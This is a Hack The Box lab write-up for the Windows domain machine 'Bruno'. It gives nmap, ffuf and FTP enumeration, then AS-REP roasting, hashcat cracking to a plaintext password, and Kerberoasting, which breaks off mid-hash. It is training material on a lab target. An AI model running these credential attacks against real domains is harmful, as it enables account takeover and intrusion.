@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Bruno | Paracausal Telemetry</title><meta name="description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80,443), FTP (21)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-bruno/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Bruno" /><meta property="og:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80,443), FTP (21)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-bruno/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-bruno/og.png?v=f6f88a66" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Bruno" /><meta name="twitter:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80,443), FTP (21)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-bruno/og.png?v=f6f88a66" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Bruno","description":"Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80,443), FTP (21).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-bruno/","datePublished":"2026-03-27","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Bruno","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-bruno/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Bruno</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-03-27 · 14 min read</p><h1>Bruno</h1><p>Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80,443), FTP (21).</p><div class="writeup-meta"><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Bruno" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-bruno.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-bruno.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Bruno</h2><p>Bruno is a medium-difficulty Windows domain box that chains insecure application configuration and weak Active Directory hygiene to go from no access to domain admin. The service-facing component is a custom .NET application that extracts ZIP entries unsafely using…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>21 Oct 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>xct</dd></div><div><dt>Rating</dt><dd>4.8 / 5</dd></div><div><dt>User owns</dt><dd>607</dd></div><div><dt>Root owns</dt><dd>481</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 28S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 29S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 353 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>8 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>3 votes</title></rect><rect x="52" y="55" width="20" height="9" rx="2" fill="hsl(80 70% 55%)"><title>17 votes</title></rect><rect x="78" y="44" width="20" height="20" rx="2" fill="hsl(70 70% 55%)"><title>40 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>128 votes</title></rect><rect x="130" y="31" width="20" height="33" rx="2" fill="hsl(38 70% 55%)"><title>65 votes</title></rect><rect x="156" y="32" width="20" height="32" rx="2" fill="hsl(28 70% 55%)"><title>63 votes</title></rect><rect x="182" y="57" width="20" height="7" rx="2" fill="hsl(16 70% 55%)"><title>14 votes</title></rect><rect x="208" y="60" width="20" height="4" rx="2" fill="hsl(8 70% 55%)"><title>7 votes</title></rect><rect x="234" y="60" width="20" height="4" rx="2" fill="hsl(0 70% 55%)"><title>8 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 6.8, Real-Life 5.8, CVE 4.8, Custom Exploitation 5.2, CTF-Like 4.2"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,62.4 148.6,97.5 129.7,137.2 88.6,139.4 82.0,100.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Bruno" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.238.9 --generate-hosts-file /etc/hosts            
+[sudo] password for kali: 
+SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.238.9          
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 18:11 +0000
+Nmap scan report for 10.129.238.9
+Host is up (0.015s latency).
+Not shown: 65513 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+56106/tcp open  unknown
+56109/tcp open  unknown
+63099/tcp open  unknown
+63104/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.33 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 21,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,9389 -A --min-rate=2000 -sT brunodc.bruno.vl
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 18:14 +0000
+Nmap scan report for brunodc.bruno.vl (10.129.238.9)
+Host is up (0.015s latency).
+rDNS record for 10.129.238.9: BRUNODC.bruno.vl
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 06-29-22  04:55PM       &lt;DIR&gt;          app
+| 06-29-22  04:33PM       &lt;DIR&gt;          benign
+| 06-29-22  01:41PM       &lt;DIR&gt;          malicious
+|_06-29-22  04:33PM       &lt;DIR&gt;          queue
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-27 18:14:11Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
+| Not valid before: 2025-10-09T09:54:08
+|_Not valid after:  2105-10-09T09:54:08
+443/tcp  open  ssl/https?
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
+| Not valid before: 2022-06-29T13:23:01
+|_Not valid after:  2121-06-29T13:33:00
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap
+|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
+| Not valid before: 2025-10-09T09:54:08
+|_Not valid after:  2105-10-09T09:54:08
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
+| Not valid before: 2025-10-09T09:54:08
+|_Not valid after:  2105-10-09T09:54:08
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
+| Not valid before: 2025-10-09T09:54:08
+|_Not valid after:  2105-10-09T09:54:08
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-03-27T18:15:35+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=brunodc.bruno.vl
+| Not valid before: 2026-03-26T18:09:34
+|_Not valid after:  2026-09-25T18:09:34
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>The web server looks to be just default IIS and the same it true on port 443</p><h2>SMB (445)</h2><p>Null auth is enabled but not able to access shares of list users</p><p>Guest account is disabled</p><h2>HTTP (80,443)</h2><p>Both pages are default IIS landing pages, nothing too interesting there</p><h3>Ffuf for vhosts</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ffuf -u http://bruno.vl/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host: FUZZ.bruno.vl&#39; -t 50 -fs 703
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://bruno.vl/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.bruno.vl
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 703
+________________________________________________
+
+dev                     [Status: 200, Size: 5948, Words: 3085, Lines: 196, Duration: 21ms]
+:: Progress: [114442/114442] :: Job [1/1] :: 350 req/sec :: Duration: [0:01:01] :: Errors: 0 ::</code></pre><h2>FTP (21)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ftp brunodc.bruno.vl                             
+Connected to BRUNODC.bruno.vl.
+220 Microsoft FTP Service
+Name (brunodc.bruno.vl:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||53578|)
+150 Opening ASCII mode data connection.
+06-29-22  04:55PM       &lt;DIR&gt;          app
+06-29-22  04:33PM       &lt;DIR&gt;          benign
+06-29-22  01:41PM       &lt;DIR&gt;          malicious
+06-29-22  04:33PM       &lt;DIR&gt;          queue</code></pre><p>Both <code>malicious</code> and <code>queue</code> are empty</p><p><code>benign</code> had a test.exe file which was nothing</p><p>Inside app there is a changelog with a user <code>svc_scan</code></p><p>I could try some AS-REP roasting on this user</p><h2>AS-REP roasting leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap brunodc.bruno.vl -u svc_scan -p &#39;&#39; --asreproast asrep.hash   
+LDAP        10.129.11.5     389    BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl) (signing:None) (channel binding:Never)
+LDAP        10.129.11.5     389    BRUNODC          $krb5asrep$23$svc_scan@BRUNO.VL:4a533e557cec89a10844e77f1dd508bb$40614fda7d2d66b1e163050ddfa2a36f0b8a39077baa596a041a8c2df650e477d292a9d9d04984e5aeb5a8914e2e1c0c6117050e30bf92df6d33b54fced24c2bbed593184afc3654895b2572b3025455729e42fb221337db0b23c98e0e71c0e7cd12b5b3ac0d9c5da4df1fc11cf955b182aad172179f6573ace8a44ea720894906e55dbcf2f339aae6b3ea92e078f56ef047e00dde9861dbad943a9e552eb02fb0fbddcd691a47a0dfddf9b8a67e9a41a9406b1c5d380dd8de45659f728e9d0f27353b5224338f2fed306cdef2c13efb7d9d112a35f1d6fb7fd8b0be69f8e7befc81ce0c</code></pre><p>I managed to dump the hash of the referenced user</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat asrep.hash /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$svc_scan@BRUNO.VL:4a533e557cec89a10844e77f1dd508bb$40614fda7d2d66b1e163050ddfa2a36f0b8a39077baa596a041a8c2df650e477d292a9d9d04984e5aeb5a8914e2e1c0c6117050e30bf92df6d33b54fced24c2bbed593184afc3654895b2572b3025455729e42fb221337db0b23c98e0e71c0e7cd12b5b3ac0d9c5da4df1fc11cf955b182aad172179f6573ace8a44ea720894906e55dbcf2f339aae6b3ea92e078f56ef047e00dde9861dbad943a9e552eb02fb0fbddcd691a47a0dfddf9b8a67e9a41a9406b1c5d380dd8de45659f728e9d0f27353b5224338f2fed306cdef2c13efb7d9d112a35f1d6fb7fd8b0be69f8e7befc81ce0c:Sunshine1</code></pre><p>The hash cracked!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_scan:Sunshine1</code></pre><p>I will validate these credentials</p><h3>Access as <code>svc_scan</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb brunodc.bruno.vl -u svc_scan -p &#39;Sunshine1&#39; --shares       
+SMB         10.129.11.5     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.5     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
+SMB         10.129.11.5     445    BRUNODC          [*] Enumerated shares
+SMB         10.129.11.5     445    BRUNODC          Share           Permissions     Remark
+SMB         10.129.11.5     445    BRUNODC          -----           -----------     ------
+SMB         10.129.11.5     445    BRUNODC          ADMIN$                          Remote Admin
+SMB         10.129.11.5     445    BRUNODC          C$                              Default share
+SMB         10.129.11.5     445    BRUNODC          CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.11.5     445    BRUNODC          IPC$            READ            Remote IPC
+SMB         10.129.11.5     445    BRUNODC          NETLOGON        READ            Logon server share 
+SMB         10.129.11.5     445    BRUNODC          queue           READ,WRITE      
+SMB         10.129.11.5     445    BRUNODC          SYSVOL          READ            Logon server share</code></pre><p>READ on the default shares also read on <code>CertEnroll</code> and READ/WRITE on <code>queue</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb brunodc.bruno.vl -u svc_scan -p &#39;Sunshine1&#39; --users-export users.txt    
+SMB         10.129.11.5     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.5     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
+SMB         10.129.11.5     445    BRUNODC          -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.129.11.5     445    BRUNODC          Administrator                 2023-08-22 06:03:20 0       Built-in account for administering the computer/domain
+SMB         10.129.11.5     445    BRUNODC          Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+SMB         10.129.11.5     445    BRUNODC          krbtgt                        2022-06-29 13:22:03 0       Key Distribution Center Service Account
+SMB         10.129.11.5     445    BRUNODC          svc_net                       2022-06-29 13:35:45 0        
+SMB         10.129.11.5     445    BRUNODC          svc_scan                      2022-06-29 13:36:15 0        
+SMB         10.129.11.5     445    BRUNODC          Chloe.Ball                    2022-06-29 13:39:29 0        
+SMB         10.129.11.5     445    BRUNODC          Kayleigh.Patel                2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Donna.Harrison                2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Charles.Young                 2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Graeme.Grant                  2022-06-29 13:39:32 0        
+SMB         10.129.11.5     445    BRUNODC          Natalie.Anderson              2022-06-29 13:39:33 0        
+SMB         10.129.11.5     445    BRUNODC          Sam.Owen                      2022-06-29 13:39:33 0        
+SMB         10.129.11.5     445    BRUNODC          Jeremy.Singh                  2022-06-29 13:39:33 0        
+SMB         10.129.11.5     445    BRUNODC          Kieran.Day                    2022-06-29 13:39:34 0        
+SMB         10.129.11.5     445    BRUNODC          Hugh.Young                    2022-06-29 13:39:35 0        
+SMB         10.129.11.5     445    BRUNODC          [*] Enumerated 15 local users: BRUNO
+SMB         10.129.11.5     445    BRUNODC          [*] Writing 15 local users to users.txt</code></pre><p>Dumped all the users!</p><h2>Kerberoasting leads to user compromise</h2><p>Now i have creds its a good idea to see if there are any users that are kerberoastable. I am expecting to find the hash of <code>svc_scan</code> again</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap brunodc.bruno.vl -u svc_scan -p &#39;Sunshine1&#39; --kerberoasting kerb.hashes
+LDAP        10.129.11.5     389    BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl) (signing:None) (channel binding:Never)
+LDAP        10.129.11.5     389    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
+LDAP        10.129.11.5     389    BRUNODC          [*] Skipping disabled account: krbtgt
+LDAP        10.129.11.5     389    BRUNODC          [*] Total of records returned 2
+LDAP        10.129.11.5     389    BRUNODC          [*] sAMAccountName: svc_net, memberOf: [], pwdLastSet: 2022-06-29 14:35:45.023707, lastLogon: 2022-06-29 17:29:25.394301
+LDAP        10.129.11.5     389    BRUNODC          $krb5tgs$23$*svc_net$BRUNO.VL$bruno.vl\svc_net*$bfb567d3e5196a151d370162a91fa067$478cdf00ebb6cb9de4388dadadd086b05cba29c43ee1db6fc30771246b59b84159fa71adc28c1a2c202dac3669e06dc062892fabe42a6ba6844e6c0b792da7e64faa4777eb119c1aa80b775d9af0a5344fec7994831d947186a1a27119e9a56590fdafddce077c73845efa4652f0111d6d48f9118c0058c96a6d25c7fa8422d007e691b38460649f1fd1ccd281163cfe456450347f162536876dcd10216068389af65d59d3537889730222a71131b1c41d0689036460df1316b8afd82ff78cbe71223cfea8154e336b6096b4a22acf962f74900e0ccbed4b42d654b0caa83a97e7986df7f55e2a6ea70e16027a17ffcb6bb1c5ecce29fd5066e2689f3ba62a2a296028912fff106da89540a38fa678a29b02de4f0b1e5ad317f61dfa4ccb4edb468a429b73a9e39bcd1c50a90cf1adb8bc3d82feed0579b125735663a23835a2c1a1c644ea31a6756830453c0c889ad048c9a6e0ebfce367a90e3a1769ea07d4328d0cdbf3a6a1f7cb8cedacba6bc6f35652311d04f2ab8a37d7f2f68917fd0b99dc5ba505a3e28ba426ad0230d7be10820a7860a3fbac1d1d8de9aadaca86894437802692bac76b1995a690816abb0caf7d283908dbd1d36cb47bc7b4f540f856ecaec103a8178c5340a747cb849025868481c061e4608ed30d997cd8c8fde929a8cb7dd9ee770898ce47f71e98826bd82beb3cfa7acd03cd2bec45bea2f02f58698ec4c2a2aa05f7fe64ca80345530e1c1b450009cd6f16059dae3befbf28bf58a8a52ee2f52d6f93b982c0d8a6d2f41147d62194119c23ead4fba66aa9c3e8ee60d7fe31e73505d1ed6ec95d5e255cf729040f7abfa5db525bdfc1e5f34aabfb92340ad84ba7a6f19f780e6ea207c10349920109a49c801ec5350bd52b46fbb55a13f88acdf5dd6b1c3cca284f10f9ab9951df6229e969b7356ad8ba3981d90d9aa7a7afb5168a94e50869c70b57add56a985386f5ffd686f6c642c5464102904f0cd1977b95638c206990ac7ab799802a3167bfbb1f66e6eb5de703446c4b8fb189652d1aa623cf8b8be4f4a77e7301c6dcf93e487f21e23e59e8605fa84ddf69be0ebb503eed91a71be32866b0895b7029984656ee1312bd632390264ba43563190b595f17a94375185bcc60e395698f59ea9474d770f1098b54c63fa58e14af1ee281b970089a9c5ec21afb7be94c9fdfc83002e3ca4fc22854bcbffd03867a778cf6c5a48e34f3fa6dd78ed743b1416762e020